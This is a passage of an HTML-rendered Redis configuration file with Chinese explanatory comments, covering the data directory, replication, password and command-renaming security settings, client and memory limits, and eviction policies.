&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">dir ./</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################# &#x4E3B;&#x4ECE;&#x590D;&#x5236; #################################</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3B;&#x4ECE;&#x590D;&#x5236;. &#x8BBE;&#x7F6E;&#x8BE5;&#x6570;&#x636E;&#x5E93;&#x4E3A;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4ECE;&#x6570;&#x636E;&#x5E93;. </span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5F53;&#x672C;&#x673A;&#x4E3A;slav&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E;master&#x670D;&#x52A1;&#x7684;IP&#x5730;&#x5740;&#x53CA;&#x7AEF;&#x53E3;&#xFF0C;&#x5728;Redis&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x81EA;&#x52A8;&#x4ECE;master&#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;master&#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x4FDD;&#x62A4;&#x65F6;(&#x7528;requirepass&#x5236;&#x5B9A;&#x7684;&#x5BC6;&#x7801;)</span></span><br><span class=\"line\"><span class=\"comment\"># slav&#x670D;&#x52A1;&#x8FDE;&#x63A5;master&#x7684;&#x5BC6;&#x7801;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">masterauth &lt;master-password&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x4ECE;&#x5E93;&#x540C;&#x4E3B;&#x673A;&#x5931;&#x53BB;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x590D;&#x5236;&#x6B63;&#x5728;&#x8FDB;&#x884C;&#xFF0C;&#x4ECE;&#x673A;&#x5E93;&#x6709;&#x4E24;&#x79CD;&#x8FD0;&#x884C;&#x65B9;&#x5F0F;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) &#x5982;&#x679C;slave-serve-stale-data&#x8BBE;&#x7F6E;&#x4E3A;yes(&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;)&#xFF0C;&#x4ECE;&#x5E93;&#x4F1A;&#x7EE7;&#x7EED;&#x76F8;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># 2) &#x5982;&#x679C;slave-serve-stale-data&#x662F;&#x6307;&#x4E3A;no&#xFF0C;&#x51FA;&#x53BB;INFO&#x548C;SLAVOF&#x547D;&#x4EE4;&#x4E4B;&#x5916;&#x7684;&#x4EFB;&#x4F55;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;</span></span><br><span class=\"line\"><span class=\"comment\">#    &#x9519;&#x8BEF;&quot;SYNC with master in progress&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">slave-serve-stale-data yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F53;&#x662F;&#x5426;&#x63A5;&#x53D7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x901A;&#x8FC7;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#x6765;&#x5B58;&#x50A8;&#x4E00;&#x4E9B;&#x77ED;&#x6682;&#x7684;&#x6570;&#x636E;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A; slave &#x5B9E;&#x4F8B;&#x6765;&#x8BF4;&#x53EF;&#x80FD;&#x662F;&#x6709;&#x7528;&#x7684;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x56E0;&#x4E3A;&#x76F8;&#x5BF9;&#x4ECE; master &#x91CD;&#x65B0;&#x540C;&#x6B65;&#x6570;&#x800C;&#x8A00;&#xFF0C;&#x636E;&#x6570;&#x636E;&#x5199;&#x5165;&#x5230; slave &#x4F1A;&#x66F4;&#x5BB9;&#x6613;&#x88AB;&#x5220;&#x9664;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x5199;&#x5165;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4ECE; redis 2.6 &#x7248;&#x8D77;&#xFF0C;&#x9ED8;&#x8BA4; slaves &#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Note: read only slaves are not designed to be exposed to untrusted clients</span></span><br><span class=\"line\"><span class=\"comment\"># on the internet. It&apos;s just a protection layer against misuse of the instance.</span></span><br><span class=\"line\"><span class=\"comment\"># Still a read only slave exports by default all the administrative commands</span></span><br><span class=\"line\"><span class=\"comment\"># such as CONFIG, DEBUG, and so forth. To a limited extent you can improve</span></span><br><span class=\"line\"><span class=\"comment\"># security of read only slaves using &apos;rename-command&apos; to shadow all the</span></span><br><span class=\"line\"><span class=\"comment\"># administrative / dangerous commands.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x8BFB;&#x7684; slaves &#x6CA1;&#x6709;&#x88AB;&#x8BBE;&#x8BA1;&#x6210;&#x5728; internet &#x4E0A;&#x66B4;&#x9732;&#x7ED9;&#x4E0D;&#x53D7;&#x4FE1;&#x4EFB;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B83;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x9488;&#x5BF9;&#x8BEF;&#x7528;&#x5B9E;&#x4F8B;&#x7684;&#x4E00;&#x4E2A;&#x4FDD;&#x62A4;&#x5C42;&#x3002;</span></span><br><span class=\"line\">slave-read-only yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Slaves &#x5728;&#x4E00;&#x4E2A;&#x9884;&#x5B9A;&#x4E49;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x53D1;&#x9001; ping &#x547D;&#x4EE4;&#x5230; server &#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F60;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x3002;&#x9ED8;&#x8BA4;&#x4E3A; 10 &#x79D2;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-ping-slave-period 10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The following option sets the replication timeout for:</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x671F;&#x65F6;&#x95F4;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># 1) Bulk transfer I/O during SYNC, from the point of view of slave.</span></span><br><span class=\"line\"><span class=\"comment\"># 2) Master timeout from the point of view of slaves (data, pings).</span></span><br><span class=\"line\"><span class=\"comment\"># 3) Slave timeout from the point of view of masters (REPLCONF ACK pings).</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># It is important to make sure that this value is greater than the value</span></span><br><span class=\"line\"><span class=\"comment\"># specified for repl-ping-slave-period otherwise a timeout will be detected</span></span><br><span class=\"line\"><span class=\"comment\"># every time there is low traffic between the master and the slave.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x4E00;&#x5B9A;&#x8981;&#x6BD4; repl-ping-slave-period &#x5927;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-timeout 60</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># Disable TCP_NODELAY on the slave socket after SYNC?</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If you select &quot;yes&quot; Redis will use a smaller number of TCP packets and</span></span><br><span class=\"line\"><span class=\"comment\"># less bandwidth to send data to slaves. But this can add a delay for</span></span><br><span class=\"line\"><span class=\"comment\"># the data to appear on the slave side, up to 40 milliseconds with</span></span><br><span class=\"line\"><span class=\"comment\"># Linux kernels using a default configuration.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># If you select &quot;no&quot; the delay for data to appear on the slave side will</span></span><br><span class=\"line\"><span class=\"comment\"># be reduced but more bandwidth will be used for replication.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default we optimize for low latency, but in very high traffic conditions</span></span><br><span class=\"line\"><span class=\"comment\"># or when the master and slaves are many hops away, turning this to &quot;yes&quot; may</span></span><br><span class=\"line\"><span class=\"comment\"># be a good idea.</span></span><br><span class=\"line\">repl-disable-tcp-nodelay no</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x5BB9;&#x91CF;&#x5927;&#x5C0F;&#x3002;&#x8FD9;&#x4E2A; backlog &#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5728; slaves &#x88AB;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5B58;&#x653E; slave &#x6570;&#x636E;&#x7684; buffer&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x4E00;&#x4E2A; slave &#x60F3;&#x8981;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#xFF0C;&#x901A;&#x5E38;&#x4E0D;&#x5E0C;&#x671B;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x540C;&#x6B65;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x53EA;&#x662F;&#x90E8;&#x5206;&#x540C;&#x6B65;&#x5C31;&#x591F;&#x4E86;&#xFF0C;&#x4EC5;&#x4EC5;&#x4F20;&#x9012; slave &#x5728;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x65F6;&#x4E22;&#x5931;&#x7684;&#x8FD9;&#x90E8;&#x5206;&#x6570;&#x636E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The biggest the replication backlog, the longer the time the slave can be</span></span><br><span class=\"line\"><span class=\"comment\"># disconnected and later be able to perform a partial resynchronization.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5927;&#xFF0C;salve &#x53EF;&#x4EE5;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x8D8A;&#x957F;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The backlog is only allocated once there is at least a slave connected.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-backlog-size 1mb</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># After a master has no longer connected slaves for some time, the backlog</span></span><br><span class=\"line\"><span class=\"comment\"># will be freed. The following option configures the amount of seconds that</span></span><br><span class=\"line\"><span class=\"comment\"># need to elapse, starting from the time the last slave disconnected, for</span></span><br><span class=\"line\"><span class=\"comment\"># the backlog buffer to be freed.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x67D0;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;master &#x4E0D;&#x518D;&#x8FDE;&#x63A5; slaves&#xFF0C;backlog &#x5C06;&#x88AB;&#x91CA;&#x653E;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># A value of 0 means to never release the backlog.</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E3A; 0 &#xFF0C;&#x610F;&#x5473;&#x7740;&#x7EDD;&#x4E0D;&#x91CA;&#x653E; backlog &#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># repl-backlog-ttl 3600</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53; master &#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;Redis Sentinel &#x4F1A;&#x4ECE; slaves &#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684; master&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x503C;&#x8D8A;&#x5C0F;&#xFF0C;&#x5C31;&#x8D8A;&#x4F1A;&#x88AB;&#x4F18;&#x5148;&#x9009;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x662F; 0 &#xFF0C; &#x90A3;&#x662F;&#x610F;&#x5473;&#x7740;&#x8FD9;&#x4E2A; slave &#x4E0D;&#x53EF;&#x80FD;&#x88AB;&#x9009;&#x4E2D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x4F18;&#x5148;&#x7EA7;&#x4E3A; 100&#x3002;</span></span><br><span class=\"line\">slave-priority 100</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># It is possible for a master to stop accepting writes if there are less than</span></span><br><span class=\"line\"><span class=\"comment\"># N slaves connected, having a lag less or equal than M seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The N slaves need to be in &quot;online&quot; state.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># The lag in seconds, that must be &lt;= the specified value, is calculated from</span></span><br><span class=\"line\"><span class=\"comment\"># the last ping received from the slave, that is usually sent every second.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># This option does not GUARANTEES that N replicas will accept the write, but</span></span><br><span class=\"line\"><span class=\"comment\"># will limit the window of exposure for lost writes in case not enough slaves</span></span><br><span class=\"line\"><span class=\"comment\"># are available, to the specified number of seconds.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># For example to require at least 3 slaves with a lag &lt;= 10 seconds use:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-to-write 3</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-max-lag 10</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Setting one or the other to 0 disables the feature.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># By default min-slaves-to-write is set to 0 (feature disabled) and</span></span><br><span class=\"line\"><span class=\"comment\"># min-slaves-max-lag is set to 10.   </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################## &#x5B89;&#x5168; ###################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x540E;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x6307;&#x5B9A;&#x524D;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8B66;&#x544A;&#xFF1A;&#x56E0;&#x4E3A;redis&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x4E00;&#x53F0;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0B;&#xFF0C;&#x4E00;&#x4E2A;&#x5916;&#x90E8;&#x7684;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x79D2;&#x949F;&#x8FDB;&#x884C;150K&#x6B21;&#x7684;&#x5BC6;&#x7801;&#x5C1D;&#x8BD5;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4F60;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x975E;&#x5E38;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5BC6;&#x7801;&#x6765;&#x9632;&#x6B62;&#x66B4;&#x529B;&#x7834;&#x89E3;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">requirepass foobared</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x547D;&#x4EE4;&#x91CD;&#x547D;&#x540D;.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5728;&#x4E00;&#x4E2A;&#x5171;&#x4EAB;&#x73AF;&#x5883;&#x4E0B;&#x53EF;&#x4EE5;&#x91CD;&#x547D;&#x540D;&#x76F8;&#x5BF9;&#x5371;&#x9669;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x6BD4;&#x5982;&#x628A;CONFIG&#x91CD;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5BB9;&#x6613;&#x731C;&#x6D4B;&#x7684;&#x5B57;&#x7B26;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4E3E;&#x4F8B;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x60F3;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x76F4;&#x63A5;&#x628A;&#x5B83;&#x91CD;&#x547D;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x7A7A;&#x5B57;&#x7B26;&quot;&quot;&#x5373;&#x53EF;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># rename-command CONFIG &quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Please note that changing the name of commands that are logged into the</span></span><br><span class=\"line\"><span class=\"comment\"># AOF file or transmitted to slaves may cause problems.</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">################################### &#x7EA6;&#x675F; ####################################</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x6700;&#x5927;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#xFF0C;&#x9ED8;&#x8BA4;&#x65E0;&#x9650;&#x5236;&#xFF0C;Redis&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x6253;&#x5F00;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x4E3A;Redis&#x8FDB;&#x7A0B;&#x53EF;&#x4EE5;&#x6253;&#x5F00;&#x7684;&#x6700;&#x5927;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6570;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x8BBE;&#x7F6E; maxclients 0&#xFF0C;&#x8868;&#x793A;&#x4E0D;&#x4F5C;&#x9650;&#x5236;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x6570;&#x5230;&#x8FBE;&#x9650;&#x5236;&#x65F6;&#xFF0C;Redis&#x4F1A;&#x5173;&#x95ED;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x5E76;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;max number of clients reached&#x9519;&#x8BEF;&#x4FE1;&#x606F;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxclients 128</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;Redis&#x6700;&#x5927;&#x5185;&#x5B58;&#x9650;&#x5236;&#xFF0C;Redis&#x5728;&#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x628A;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x5185;&#x5B58;&#x540E;&#xFF0C;Redis&#x4F1A;&#x5148;&#x5C1D;&#x8BD5;&#x6E05;&#x9664;&#x5DF2;&#x5230;&#x671F;&#x6216;&#x5373;&#x5C06;&#x5230;&#x671F;&#x7684;Key</span></span><br><span class=\"line\"><span class=\"comment\"># Redis&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x79FB;&#x9664;&#x7A7A;&#x7684;list&#x5BF9;&#x8C61;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x6B64;&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x4ECD;&#x7136;&#x5230;&#x8FBE;&#x6700;&#x5927;&#x5185;&#x5B58;&#x8BBE;&#x7F6E;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x518D;&#x8FDB;&#x884C;&#x5199;&#x5165;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;Redis&#x65B0;&#x7684;vm&#x673A;&#x5236;&#xFF0C;&#x4F1A;&#x628A;Key&#x5B58;&#x653E;&#x5185;&#x5B58;&#xFF0C;Value&#x4F1A;&#x5B58;&#x653E;&#x5728;swap&#x533A;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory&#x7684;&#x8BBE;&#x7F6E;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x4E8E;&#x628A;redis&#x5F53;&#x4F5C;&#x4E8E;&#x7C7B;&#x4F3C;memcached&#x7684;&#x7F13;&#x5B58;&#x6765;&#x4F7F;&#x7528;&#xFF0C;&#x800C;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;DB&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x628A;Redis&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x771F;&#x5B9E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x5C06;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x5927;&#x7684;&#x5F00;&#x9500;</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory &lt;bytes&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;&#x5185;&#x5B58;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x503C;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x9009;&#x62E9;&#x5220;&#x9664;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#xFF1F;&#x6709;&#x4E94;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4F9B;&#x9009;&#x62E9;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># volatile-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;key (LRU:&#x6700;&#x8FD1;&#x4F7F;&#x7528; Least Recently Used )</span></span><br><span class=\"line\"><span class=\"comment\"># allkeys-lru -&gt; &#x5229;&#x7528;LRU&#x7B97;&#x6CD5;&#x79FB;&#x9664;&#x4EFB;&#x4F55;key</span></span><br><span class=\"line\"><span class=\"comment\"># volatile-random -&gt; &#x79FB;&#x9664;&#x8BBE;&#x7F6E;&#x8FC7;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x968F;&#x673A;key</span></span><br><span class=\"line\"><span class=\"comment\"># allkeys-&gt;random -&gt; remove a random key, any key</span></span><br><span class=\"line\"><span class=\"comment\"># volatile-ttl -&gt; &#x79FB;&#x9664;&#x5373;&#x5C06;&#x8FC7;&#x671F;&#x7684;key(minor TTL)</span></span><br><span class=\"line\"><span class=\"comment\"># noeviction -&gt; &#x4E0D;&#x79FB;&#x9664;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#xFF0C;&#x53EA;&#x662F;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5199;&#x9519;&#x8BEF;</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\"><span class=\"comment\"># &#x6CE8;&#x610F;&#xFF1A;&#x5BF9;&#x4E8E;&#x4E0A;&#x9762;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5408;&#x9002;&#x7684;key&#x53EF;&#x4EE5;&#x79FB;&#x9664;&#xFF0C;&#x5F53;&#x5199;&#x7684;&#x65F6;&#x5019;Redis&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x9519;&#x8BEF;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#       &#x5199;&#x547D;&#x4EE4;&#x5305;&#x62EC;: set setnx setex append</span></span><br><span class=\"line\"><span class=\"comment\">#       incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd</span></span><br><span class=\"line\"><span class=\"comment\">#       sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby</span></span><br><span class=\"line\"><span class=\"comment\">#       zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby</span></span><br><span class=\"line\"><span class=\"comment\">#       getset mset msetnx exec sort</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x662F;:</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># maxmemory-policy volatile-lru</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># LRU &#x548C; minimal TTL 